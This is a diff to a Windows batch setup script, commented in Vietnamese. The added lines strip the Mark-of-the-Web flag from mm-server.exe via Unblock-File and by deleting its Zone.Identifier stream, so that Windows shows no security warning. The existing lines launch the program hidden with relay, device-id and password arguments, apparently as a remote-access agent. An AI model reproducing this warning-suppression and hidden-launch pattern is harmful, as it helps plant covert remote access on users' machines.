@@ -52,6 +52,11 @@ if not exist "%DIR%\mm-server.exe" (
   exit /b 1
 )
 
+rem --- QUAN TRONG: bo co "tai tu mang" (Mark-of-the-Web) de KHONG hien
+rem     bang "Security Warning" khi tu chay luc khoi dong ---
+powershell -NoProfile -Command "Unblock-File -LiteralPath '%DIR%\mm-server.exe'" >nul 2>&1
+del "%DIR%\mm-server.exe:Zone.Identifier" >nul 2>&1
+
 rem --- FILE KHOI DONG DUY NHAT: start.vbs (chay mm-server AN) ---
 > "%DIR%\start.vbs" echo CreateObject("WScript.Shell").Run """%DIR%\mm-server.exe"" --relay %RELAY% --device-id %COMPUTERNAME% --device-name %COMPUTERNAME% --password %MM_PW%", 0, False
 
